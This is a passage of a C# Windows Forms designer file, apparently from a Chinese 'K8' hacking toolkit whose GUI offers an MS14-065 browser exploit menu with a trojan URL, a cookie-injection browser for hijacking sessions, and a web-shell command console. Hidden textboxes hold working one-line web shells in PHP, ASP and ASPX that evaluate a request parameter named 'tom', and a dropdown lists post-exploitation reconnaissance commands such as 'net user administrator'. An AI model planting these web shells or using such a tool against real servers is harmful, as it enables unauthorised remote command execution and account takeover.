            this.day网马ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("day网马ToolStripMenuItem.Image")));
            this.day网马ToolStripMenuItem.Name = "day网马ToolStripMenuItem";
            this.day网马ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.day网马ToolStripMenuItem.Text = "0day网马";
            // 
            // mS14065ToolStripMenuItem
            // 
            this.mS14065ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mS14065ToolStripMenuItem.Image")));
            this.mS14065ToolStripMenuItem.Name = "mS14065ToolStripMenuItem";
            this.mS14065ToolStripMenuItem.Size = new System.Drawing.Size(202, 22);
            this.mS14065ToolStripMenuItem.Text = "MS14-065(HTTP木马地址)";
            this.mS14065ToolStripMenuItem.Click += new System.EventHandler(this.mS14065ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem64
            // 
            this.toolStripMenuItem64.Name = "toolStripMenuItem64";
            this.toolStripMenuItem64.Size = new System.Drawing.Size(127, 6);
            // 
            // 浏览器ToolStripMenuItem
            // 
            this.浏览器ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.用Firefox打开ToolStripMenuItem2,
            this.用Chrome打开ToolStripMenuItem2,
            this.用微软IE打开ToolStripMenuItem2});
            this.浏览器ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("浏览器ToolStripMenuItem.Image")));
            this.浏览器ToolStripMenuItem.Name = "浏览器ToolStripMenuItem";
            this.浏览器ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.浏览器ToolStripMenuItem.Text = "浏览器 →";
            // 
            // 用Firefox打开ToolStripMenuItem2
            // 
            this.用Firefox打开ToolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("用Firefox打开ToolStripMenuItem2.Image")));
            this.用Firefox打开ToolStripMenuItem2.Name = "用Firefox打开ToolStripMenuItem2";
            this.用Firefox打开ToolStripMenuItem2.Size = new System.Drawing.Size(196, 22);
            this.用Firefox打开ToolStripMenuItem2.Text = "用Firefox-->打开(URL)";
            this.用Firefox打开ToolStripMenuItem2.Click += new System.EventHandler(this.用Firefox打开ToolStripMenuItem2_Click);
            // 
            // 用Chrome打开ToolStripMenuItem2
            // 
            this.用Chrome打开ToolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("用Chrome打开ToolStripMenuItem2.Image")));
            this.用Chrome打开ToolStripMenuItem2.Name = "用Chrome打开ToolStripMenuItem2";
            this.用Chrome打开ToolStripMenuItem2.Size = new System.Drawing.Size(196, 22);
            this.用Chrome打开ToolStripMenuItem2.Text = "用Chrome->打开(URL)";
            this.用Chrome打开ToolStripMenuItem2.Click += new System.EventHandler(this.用Chrome打开ToolStripMenuItem2_Click);
            // 
            // 用微软IE打开ToolStripMenuItem2
            // 
            this.用微软IE打开ToolStripMenuItem2.Image = ((System.Drawing.Image)(resources.GetObject("用微软IE打开ToolStripMenuItem2.Image")));
            this.用微软IE打开ToolStripMenuItem2.Name = "用微软IE打开ToolStripMenuItem2";
            this.用微软IE打开ToolStripMenuItem2.Size = new System.Drawing.Size(196, 22);
            this.用微软IE打开ToolStripMenuItem2.Text = "用微软IE -->打开(URL)";
            this.用微软IE打开ToolStripMenuItem2.Click += new System.EventHandler(this.用微软IE打开ToolStripMenuItem2_Click);
            // 
            // toolStripMenuItem28
            // 
            this.toolStripMenuItem28.Name = "toolStripMenuItem28";
            this.toolStripMenuItem28.Size = new System.Drawing.Size(121, 6);
            // 
            // 剪切ToolStripMenuItem
            // 
            this.剪切ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("剪切ToolStripMenuItem.Image")));
            this.剪切ToolStripMenuItem.Name = "剪切ToolStripMenuItem";
            this.剪切ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.剪切ToolStripMenuItem.Text = "剪切";
            this.剪切ToolStripMenuItem.Click += new System.EventHandler(this.剪切ToolStripMenuItem_Click);
            // 
            // 复制ToolStripMenuItem
            // 
            this.复制ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("复制ToolStripMenuItem.Image")));
            this.复制ToolStripMenuItem.Name = "复制ToolStripMenuItem";
            this.复制ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.复制ToolStripMenuItem.Text = "复制";
            this.复制ToolStripMenuItem.Click += new System.EventHandler(this.复制ToolStripMenuItem_Click);
            // 
            // 粘贴ToolStripMenuItem
            // 
            this.粘贴ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("粘贴ToolStripMenuItem.Image")));
            this.粘贴ToolStripMenuItem.Name = "粘贴ToolStripMenuItem";
            this.粘贴ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.粘贴ToolStripMenuItem.Text = "粘贴";
            this.粘贴ToolStripMenuItem.Click += new System.EventHandler(this.粘贴ToolStripMenuItem_Click);
            // 
            // 删除ToolStripMenuItem1
            // 
            this.删除ToolStripMenuItem1.Image = ((System.Drawing.Image)(resources.GetObject("删除ToolStripMenuItem1.Image")));
            this.删除ToolStripMenuItem1.Name = "删除ToolStripMenuItem1";
            this.删除ToolStripMenuItem1.Size = new System.Drawing.Size(124, 22);
            this.删除ToolStripMenuItem1.Text = "删除";
            this.删除ToolStripMenuItem1.Click += new System.EventHandler(this.删除ToolStripMenuItem1_Click);
            // 
            // 全选ToolStripMenuItem
            // 
            this.全选ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("全选ToolStripMenuItem.Image")));
            this.全选ToolStripMenuItem.Name = "全选ToolStripMenuItem";
            this.全选ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.全选ToolStripMenuItem.Text = "全选";
            this.全选ToolStripMenuItem.Click += new System.EventHandler(this.全选ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem10
            // 
            this.toolStripMenuItem10.Name = "toolStripMenuItem10";
            this.toolStripMenuItem10.Size = new System.Drawing.Size(121, 6);
            // 
            // 转成大写ToolStripMenuItem
            // 
            this.转成大写ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成大写ToolStripMenuItem.Image")));
            this.转成大写ToolStripMenuItem.Name = "转成大写ToolStripMenuItem";
            this.转成大写ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.转成大写ToolStripMenuItem.Text = "转成大写";
            this.转成大写ToolStripMenuItem.Click += new System.EventHandler(this.转成大写ToolStripMenuItem_Click);
            // 
            // 转成小写ToolStripMenuItem
            // 
            this.转成小写ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成小写ToolStripMenuItem.Image")));
            this.转成小写ToolStripMenuItem.Name = "转成小写ToolStripMenuItem";
            this.转成小写ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.转成小写ToolStripMenuItem.Text = "转成小写";
            this.转成小写ToolStripMenuItem.Click += new System.EventHandler(this.转成小写ToolStripMenuItem_Click);
            // 
            // 转成半角ToolStripMenuItem
            // 
            this.转成半角ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成半角ToolStripMenuItem.Image")));
            this.转成半角ToolStripMenuItem.Name = "转成半角ToolStripMenuItem";
            this.转成半角ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.转成半角ToolStripMenuItem.Text = "转成半角";
            this.转成半角ToolStripMenuItem.Click += new System.EventHandler(this.转成半角ToolStripMenuItem_Click);
            // 
            // 转成全角ToolStripMenuItem
            // 
            this.转成全角ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成全角ToolStripMenuItem.Image")));
            this.转成全角ToolStripMenuItem.Name = "转成全角ToolStripMenuItem";
            this.转成全角ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.转成全角ToolStripMenuItem.Text = "转成全角";
            this.转成全角ToolStripMenuItem.Click += new System.EventHandler(this.转成全角ToolStripMenuItem_Click);
            // 
            // 转成一行ToolStripMenuItem
            // 
            this.转成一行ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("转成一行ToolStripMenuItem.Image")));
            this.转成一行ToolStripMenuItem.Name = "转成一行ToolStripMenuItem";
            this.转成一行ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.转成一行ToolStripMenuItem.Text = "转成一行";
            this.转成一行ToolStripMenuItem.Click += new System.EventHandler(this.转成一行ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem11
            // 
            this.toolStripMenuItem11.Name = "toolStripMenuItem11";
            this.toolStripMenuItem11.Size = new System.Drawing.Size(121, 6);
            // 
            // txt_ms14065
            // 
            this.txt_ms14065.Location = new System.Drawing.Point(34, 33);
            this.txt_ms14065.Multiline = true;
            this.txt_ms14065.Name = "txt_ms14065";
            this.txt_ms14065.Size = new System.Drawing.Size(168, 98);
            this.txt_ms14065.TabIndex = 115;
            this.txt_ms14065.Text = resources.GetString("txt_ms14065.Text");
            this.txt_ms14065.Visible = false;
            // 
            // tab_CookieBrowser
            // 
            this.tab_CookieBrowser.Controls.Add(this.txt_getHttponlyCookie);
            this.tab_CookieBrowser.Controls.Add(this.txt_getCookies);
            this.tab_CookieBrowser.Controls.Add(this.btn_setHttponlyCookie);
            this.tab_CookieBrowser.Controls.Add(this.btn_UpdateCookies);
            this.tab_CookieBrowser.Controls.Add(this.btn_navigateURL);
            this.tab_CookieBrowser.Controls.Add(this.label8);
            this.tab_CookieBrowser.Controls.Add(this.txt_cookiesURL);
            this.tab_CookieBrowser.Controls.Add(this.btn_setCookieExpires);
            this.tab_CookieBrowser.Controls.Add(this.web_cookie);
            this.tab_CookieBrowser.ImageIndex = 77;
            this.tab_CookieBrowser.Location = new System.Drawing.Point(4, 4);
            this.tab_CookieBrowser.Name = "tab_CookieBrowser";
            this.tab_CookieBrowser.Padding = new System.Windows.Forms.Padding(3);
            this.tab_CookieBrowser.Size = new System.Drawing.Size(980, 623);
            this.tab_CookieBrowser.TabIndex = 6;
            this.tab_CookieBrowser.Text = "CookieBrowser";
            this.tab_CookieBrowser.UseVisualStyleBackColor = true;
            // 
            // txt_getHttponlyCookie
            // 
            this.txt_getHttponlyCookie.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_getHttponlyCookie.Location = new System.Drawing.Point(6, 69);
            this.txt_getHttponlyCookie.Multiline = true;
            this.txt_getHttponlyCookie.Name = "txt_getHttponlyCookie";
            this.txt_getHttponlyCookie.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_getHttponlyCookie.Size = new System.Drawing.Size(975, 30);
            this.txt_getHttponlyCookie.TabIndex = 58;
            this.txt_getHttponlyCookie.Text = "httponly cookie";
            // 
            // txt_getCookies
            // 
            this.txt_getCookies.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_getCookies.Location = new System.Drawing.Point(7, 33);
            this.txt_getCookies.Multiline = true;
            this.txt_getCookies.Name = "txt_getCookies";
            this.txt_getCookies.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_getCookies.Size = new System.Drawing.Size(974, 30);
            this.txt_getCookies.TabIndex = 45;
            this.txt_getCookies.Text = "普通cookie";
            // 
            // btn_setHttponlyCookie
            // 
            this.btn_setHttponlyCookie.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_setHttponlyCookie.Location = new System.Drawing.Point(833, 4);
            this.btn_setHttponlyCookie.Name = "btn_setHttponlyCookie";
            this.btn_setHttponlyCookie.Size = new System.Drawing.Size(147, 23);
            this.btn_setHttponlyCookie.TabIndex = 57;
            this.btn_setHttponlyCookie.Text = "设置Httponly Cookie";
            this.btn_setHttponlyCookie.UseVisualStyleBackColor = true;
            this.btn_setHttponlyCookie.Click += new System.EventHandler(this.btn_setHttponlyCookie_Click);
            // 
            // btn_UpdateCookies
            // 
            this.btn_UpdateCookies.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_UpdateCookies.Location = new System.Drawing.Point(708, 4);
            this.btn_UpdateCookies.Name = "btn_UpdateCookies";
            this.btn_UpdateCookies.Size = new System.Drawing.Size(120, 23);
            this.btn_UpdateCookies.TabIndex = 57;
            this.btn_UpdateCookies.Text = "设置普通Cookies";
            this.btn_UpdateCookies.UseVisualStyleBackColor = true;
            this.btn_UpdateCookies.Click += new System.EventHandler(this.btn_UpdateCookies_Click);
            // 
            // btn_navigateURL
            // 
            this.btn_navigateURL.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_navigateURL.Image = ((System.Drawing.Image)(resources.GetObject("btn_navigateURL.Image")));
            this.btn_navigateURL.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_navigateURL.Location = new System.Drawing.Point(543, 4);
            this.btn_navigateURL.Name = "btn_navigateURL";
            this.btn_navigateURL.Size = new System.Drawing.Size(56, 23);
            this.btn_navigateURL.TabIndex = 56;
            this.btn_navigateURL.Text = "浏览";
            this.btn_navigateURL.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_navigateURL.UseVisualStyleBackColor = true;
            this.btn_navigateURL.Click += new System.EventHandler(this.btn_navigateURL_Click);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(5, 9);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(35, 12);
            this.label8.TabIndex = 55;
            this.label8.Text = "网址:";
            // 
            // txt_cookiesURL
            // 
            this.txt_cookiesURL.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_cookiesURL.Location = new System.Drawing.Point(46, 6);
            this.txt_cookiesURL.Name = "txt_cookiesURL";
            this.txt_cookiesURL.Size = new System.Drawing.Size(491, 21);
            this.txt_cookiesURL.TabIndex = 54;
            // 
            // btn_setCookieExpires
            // 
            this.btn_setCookieExpires.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_setCookieExpires.Location = new System.Drawing.Point(604, 4);
            this.btn_setCookieExpires.Name = "btn_setCookieExpires";
            this.btn_setCookieExpires.Size = new System.Drawing.Size(99, 23);
            this.btn_setCookieExpires.TabIndex = 47;
            this.btn_setCookieExpires.Text = "使cookie过期";
            this.btn_setCookieExpires.UseVisualStyleBackColor = true;
            this.btn_setCookieExpires.Click += new System.EventHandler(this.btn_setCookies_Click);
            // 
            // web_cookie
            // 
            this.web_cookie.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.web_cookie.Location = new System.Drawing.Point(6, 105);
            this.web_cookie.MinimumSize = new System.Drawing.Size(20, 20);
            this.web_cookie.Name = "web_cookie";
            this.web_cookie.ScriptErrorsSuppressed = true;
            this.web_cookie.Size = new System.Drawing.Size(975, 518);
            this.web_cookie.TabIndex = 0;
            this.web_cookie.DocumentCompleted += new System.Windows.Forms.WebBrowserDocumentCompletedEventHandler(this.web_cookies_DocumentCompleted);
            this.web_cookie.NewWindow += new System.ComponentModel.CancelEventHandler(this.web_cookies_NewWindow);
            // 
            // tab_FileManage
            // 
            this.tab_FileManage.Controls.Add(this.label14);
            this.tab_FileManage.Controls.Add(this.lv_DirList);
            this.tab_FileManage.Controls.Add(this.button5);
            this.tab_FileManage.Controls.Add(this.cbb_WebFilePath);
            this.tab_FileManage.Controls.Add(this.tv_dirList);
            this.tab_FileManage.ImageIndex = 15;
            this.tab_FileManage.Location = new System.Drawing.Point(4, 4);
            this.tab_FileManage.Name = "tab_FileManage";
            this.tab_FileManage.Padding = new System.Windows.Forms.Padding(3);
            this.tab_FileManage.Size = new System.Drawing.Size(980, 623);
            this.tab_FileManage.TabIndex = 7;
            this.tab_FileManage.Text = "FileManage";
            this.tab_FileManage.UseVisualStyleBackColor = true;
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Location = new System.Drawing.Point(3, 35);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(185, 12);
            this.label14.TabIndex = 5;
            this.label14.Text = "127.0.0.1     目录(8) 文件(20)";
            // 
            // lv_DirList
            // 
            this.lv_DirList.Location = new System.Drawing.Point(253, 32);
            this.lv_DirList.Name = "lv_DirList";
            this.lv_DirList.Size = new System.Drawing.Size(725, 586);
            this.lv_DirList.SmallImageList = this.imgListFileMgr;
            this.lv_DirList.TabIndex = 4;
            this.lv_DirList.UseCompatibleStateImageBehavior = false;
            // 
            // imgListFileMgr
            // 
            this.imgListFileMgr.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imgListFileMgr.ImageStream")));
            this.imgListFileMgr.TransparentColor = System.Drawing.Color.Transparent;
            this.imgListFileMgr.Images.SetKeyName(0, "069.GIF");
            this.imgListFileMgr.Images.SetKeyName(1, "005.GIF");
            this.imgListFileMgr.Images.SetKeyName(2, "118.GIF");
            this.imgListFileMgr.Images.SetKeyName(3, "120.GIF");
            this.imgListFileMgr.Images.SetKeyName(4, "123.GIF");
            this.imgListFileMgr.Images.SetKeyName(5, "126.GIF");
            this.imgListFileMgr.Images.SetKeyName(6, "129.GIF");
            this.imgListFileMgr.Images.SetKeyName(7, "132.GIF");
            this.imgListFileMgr.Images.SetKeyName(8, "135.GIF");
            this.imgListFileMgr.Images.SetKeyName(9, "140.GIF");
            this.imgListFileMgr.Images.SetKeyName(10, "141.GIF");
            this.imgListFileMgr.Images.SetKeyName(11, "144.GIF");
            this.imgListFileMgr.Images.SetKeyName(12, "148.GIF");
            this.imgListFileMgr.Images.SetKeyName(13, "149.GIF");
            this.imgListFileMgr.Images.SetKeyName(14, "152.GIF");
            this.imgListFileMgr.Images.SetKeyName(15, "155.GIF");
            this.imgListFileMgr.Images.SetKeyName(16, "165.GIF");
            this.imgListFileMgr.Images.SetKeyName(17, "186.GIF");
            this.imgListFileMgr.Images.SetKeyName(18, "197.GIF");
            this.imgListFileMgr.Images.SetKeyName(19, "240.GIF");
            this.imgListFileMgr.Images.SetKeyName(20, "243.GIF");
            this.imgListFileMgr.Images.SetKeyName(21, "258.GIF");
            this.imgListFileMgr.Images.SetKeyName(22, "284.GIF");
            // 
            // button5
            // 
            this.button5.Location = new System.Drawing.Point(989, 3);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(60, 26);
            this.button5.TabIndex = 2;
            this.button5.Text = "button5";
            this.button5.UseVisualStyleBackColor = true;
            // 
            // cbb_WebFilePath
            // 
            this.cbb_WebFilePath.FormattingEnabled = true;
            this.cbb_WebFilePath.Location = new System.Drawing.Point(6, 3);
            this.cbb_WebFilePath.Name = "cbb_WebFilePath";
            this.cbb_WebFilePath.Size = new System.Drawing.Size(977, 20);
            this.cbb_WebFilePath.TabIndex = 1;
            // 
            // tv_dirList
            // 
            this.tv_dirList.Location = new System.Drawing.Point(0, 56);
            this.tv_dirList.Name = "tv_dirList";
            this.tv_dirList.Size = new System.Drawing.Size(247, 568);
            this.tv_dirList.TabIndex = 0;
            this.tv_dirList.AfterSelect += new System.Windows.Forms.TreeViewEventHandler(this.tv_dirList_AfterSelect);
            this.tv_dirList.DoubleClick += new System.EventHandler(this.tv_dirList_DoubleClick);
            // 
            // tab_CmdShell
            // 
            this.tab_CmdShell.Controls.Add(this.rb_cgiCmd);
            this.tab_CmdShell.Controls.Add(this.rb_rubyCmd);
            this.tab_CmdShell.Controls.Add(this.rb_perlCmd);
            this.tab_CmdShell.Controls.Add(this.rb_pythonCmd);
            this.tab_CmdShell.Controls.Add(this.rb_cfmCmd);
            this.tab_CmdShell.Controls.Add(this.txt_jspOne);
            this.tab_CmdShell.Controls.Add(this.txt_phpOne);
            this.tab_CmdShell.Controls.Add(this.txt_aspOne);
            this.tab_CmdShell.Controls.Add(this.txt_aspxOne);
            this.tab_CmdShell.Controls.Add(this.btn_phpOne);
            this.tab_CmdShell.Controls.Add(this.btn_aspOne);
            this.tab_CmdShell.Controls.Add(this.btn_jspOne);
            this.tab_CmdShell.Controls.Add(this.btn_aspxOne);
            this.tab_CmdShell.Controls.Add(this.cbb_WebCommond);
            this.tab_CmdShell.Controls.Add(this.rb_aspCmd);
            this.tab_CmdShell.Controls.Add(this.label11);
            this.tab_CmdShell.Controls.Add(this.txt_TimeOutCmd);
            this.tab_CmdShell.Controls.Add(this.label10);
            this.tab_CmdShell.Controls.Add(this.cbb_utf8Gb3212CMD);
            this.tab_CmdShell.Controls.Add(this.rb_jspCmd);
            this.tab_CmdShell.Controls.Add(this.rb_phpCmd);
            this.tab_CmdShell.Controls.Add(this.label9);
            this.tab_CmdShell.Controls.Add(this.rb_aspxCmd);
            this.tab_CmdShell.Controls.Add(this.btn_ExecuteWebCMD);
            this.tab_CmdShell.Controls.Add(this.btn_connectOneShell);
            this.tab_CmdShell.Controls.Add(this.txt_OneShellPwd);
            this.tab_CmdShell.Controls.Add(this.label7);
            this.tab_CmdShell.Controls.Add(this.txt_OneShellPath);
            this.tab_CmdShell.Controls.Add(this.txt_WebCmdResult);
            this.tab_CmdShell.Controls.Add(this.chk_VisbleOnePwd);
            this.tab_CmdShell.Controls.Add(this.label6);
            this.tab_CmdShell.ImageIndex = 59;
            this.tab_CmdShell.Location = new System.Drawing.Point(4, 4);
            this.tab_CmdShell.Name = "tab_CmdShell";
            this.tab_CmdShell.Padding = new System.Windows.Forms.Padding(3);
            this.tab_CmdShell.Size = new System.Drawing.Size(980, 623);
            this.tab_CmdShell.TabIndex = 3;
            this.tab_CmdShell.Text = "CmdShell";
            this.tab_CmdShell.UseVisualStyleBackColor = true;
            // 
            // rb_cgiCmd
            // 
            this.rb_cgiCmd.AutoSize = true;
            this.rb_cgiCmd.Location = new System.Drawing.Point(442, 35);
            this.rb_cgiCmd.Name = "rb_cgiCmd";
            this.rb_cgiCmd.Size = new System.Drawing.Size(41, 16);
            this.rb_cgiCmd.TabIndex = 73;
            this.rb_cgiCmd.Text = "CGI";
            this.rb_cgiCmd.UseVisualStyleBackColor = true;
            this.rb_cgiCmd.Visible = false;
            // 
            // rb_rubyCmd
            // 
            this.rb_rubyCmd.AutoSize = true;
            this.rb_rubyCmd.Location = new System.Drawing.Point(401, 35);
            this.rb_rubyCmd.Name = "rb_rubyCmd";
            this.rb_rubyCmd.Size = new System.Drawing.Size(35, 16);
            this.rb_rubyCmd.TabIndex = 72;
            this.rb_rubyCmd.Text = "RB";
            this.rb_rubyCmd.UseVisualStyleBackColor = true;
            this.rb_rubyCmd.Visible = false;
            // 
            // rb_perlCmd
            // 
            this.rb_perlCmd.AutoSize = true;
            this.rb_perlCmd.Location = new System.Drawing.Point(360, 35);
            this.rb_perlCmd.Name = "rb_perlCmd";
            this.rb_perlCmd.Size = new System.Drawing.Size(35, 16);
            this.rb_perlCmd.TabIndex = 71;
            this.rb_perlCmd.Text = "PL";
            this.rb_perlCmd.UseVisualStyleBackColor = true;
            // 
            // rb_pythonCmd
            // 
            this.rb_pythonCmd.AutoSize = true;
            this.rb_pythonCmd.Location = new System.Drawing.Point(319, 35);
            this.rb_pythonCmd.Name = "rb_pythonCmd";
            this.rb_pythonCmd.Size = new System.Drawing.Size(35, 16);
            this.rb_pythonCmd.TabIndex = 70;
            this.rb_pythonCmd.Text = "PY";
            this.rb_pythonCmd.UseVisualStyleBackColor = true;
            // 
            // rb_cfmCmd
            // 
            this.rb_cfmCmd.AutoSize = true;
            this.rb_cfmCmd.Location = new System.Drawing.Point(272, 35);
            this.rb_cfmCmd.Name = "rb_cfmCmd";
            this.rb_cfmCmd.Size = new System.Drawing.Size(41, 16);
            this.rb_cfmCmd.TabIndex = 69;
            this.rb_cfmCmd.Text = "CFM";
            this.rb_cfmCmd.UseVisualStyleBackColor = true;
            // 
            // txt_jspOne
            // 
            this.txt_jspOne.BackColor = System.Drawing.SystemColors.Window;
            this.txt_jspOne.ForeColor = System.Drawing.SystemColors.WindowText;
            this.txt_jspOne.Location = new System.Drawing.Point(26, 483);
            this.txt_jspOne.Multiline = true;
            this.txt_jspOne.Name = "txt_jspOne";
            this.txt_jspOne.Size = new System.Drawing.Size(579, 111);
            this.txt_jspOne.TabIndex = 68;
            this.txt_jspOne.Text = resources.GetString("txt_jspOne.Text");
            this.txt_jspOne.Visible = false;
            // 
            // txt_phpOne
            // 
            this.txt_phpOne.BackColor = System.Drawing.SystemColors.Window;
            this.txt_phpOne.ForeColor = System.Drawing.SystemColors.WindowText;
            this.txt_phpOne.Location = new System.Drawing.Point(26, 346);
            this.txt_phpOne.Multiline = true;
            this.txt_phpOne.Name = "txt_phpOne";
            this.txt_phpOne.Size = new System.Drawing.Size(579, 99);
            this.txt_phpOne.TabIndex = 68;
            this.txt_phpOne.Text = "\r\n<?php @eval($_POST[\'tom\']);?>";
            this.txt_phpOne.Visible = false;
            // 
            // txt_aspOne
            // 
            this.txt_aspOne.BackColor = System.Drawing.SystemColors.Window;
            this.txt_aspOne.ForeColor = System.Drawing.SystemColors.WindowText;
            this.txt_aspOne.Location = new System.Drawing.Point(26, 214);
            this.txt_aspOne.Multiline = true;
            this.txt_aspOne.Name = "txt_aspOne";
            this.txt_aspOne.Size = new System.Drawing.Size(579, 100);
            this.txt_aspOne.TabIndex = 68;
            this.txt_aspOne.Text = "\r\n\r\n<%eval request(\"tom\")%>\r\n\r\n<%execute request(\"tom\")%>\r\n\r\n<%execute(request(\"t" +
                "om\"))%>";
            this.txt_aspOne.Visible = false;
            // 
            // txt_aspxOne
            // 
            this.txt_aspxOne.BackColor = System.Drawing.SystemColors.Window;
            this.txt_aspxOne.ForeColor = System.Drawing.SystemColors.WindowText;
            this.txt_aspxOne.Location = new System.Drawing.Point(26, 92);
            this.txt_aspxOne.Multiline = true;
            this.txt_aspxOne.Name = "txt_aspxOne";
            this.txt_aspxOne.Size = new System.Drawing.Size(579, 90);
            this.txt_aspxOne.TabIndex = 68;
            this.txt_aspxOne.Text = "\r\n\r\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"tom\"],\"unsafe\");%>\r\n\r\n<%@ P" +
                "age Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.I" +
                "tem[\"tom\"],\"unsafe\"));%>";
            this.txt_aspxOne.Visible = false;
            // 
            // btn_phpOne
            // 
            this.btn_phpOne.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_phpOne.Location = new System.Drawing.Point(852, 61);
            this.btn_phpOne.Name = "btn_phpOne";
            this.btn_phpOne.Size = new System.Drawing.Size(122, 23);
            this.btn_phpOne.TabIndex = 67;
            this.btn_phpOne.Text = "K8专用PHP一句话";
            this.btn_phpOne.UseVisualStyleBackColor = true;
            this.btn_phpOne.Click += new System.EventHandler(this.btn_phpOne_Click);
            // 
            // btn_aspOne
            // 
            this.btn_aspOne.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_aspOne.Location = new System.Drawing.Point(686, 90);
            this.btn_aspOne.Name = "btn_aspOne";
            this.btn_aspOne.Size = new System.Drawing.Size(122, 23);
            this.btn_aspOne.TabIndex = 67;
            this.btn_aspOne.Text = "K8专用ASP一句话";
            this.btn_aspOne.UseVisualStyleBackColor = true;
            this.btn_aspOne.Click += new System.EventHandler(this.btn_aspOne_Click);
            // 
            // btn_jspOne
            // 
            this.btn_jspOne.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_jspOne.Location = new System.Drawing.Point(852, 90);
            this.btn_jspOne.Name = "btn_jspOne";
            this.btn_jspOne.Size = new System.Drawing.Size(122, 23);
            this.btn_jspOne.TabIndex = 67;
            this.btn_jspOne.Text = "K8专用JSP一句话";
            this.btn_jspOne.UseVisualStyleBackColor = true;
            this.btn_jspOne.Click += new System.EventHandler(this.btn_jspOne_Click);
            // 
            // btn_aspxOne
            // 
            this.btn_aspxOne.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_aspxOne.Location = new System.Drawing.Point(686, 61);
            this.btn_aspxOne.Name = "btn_aspxOne";
            this.btn_aspxOne.Size = new System.Drawing.Size(122, 23);
            this.btn_aspxOne.TabIndex = 67;
            this.btn_aspxOne.Text = "K8专用ASPX一句话";
            this.btn_aspxOne.UseVisualStyleBackColor = true;
            this.btn_aspxOne.Click += new System.EventHandler(this.btn_aspxOne_Click);
            // 
            // cbb_WebCommond
            // 
            this.cbb_WebCommond.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.cbb_WebCommond.FormattingEnabled = true;
            this.cbb_WebCommond.Items.AddRange(new object[] {
            "netstat -an | find \"ESTABLISHED\"",
            "whoami",
            "systeminfo",
            "net view",
            "net user",
            "net users",
            "net user administrator",
            "netstat -an",
            "set",
            "dir",
            "ls",
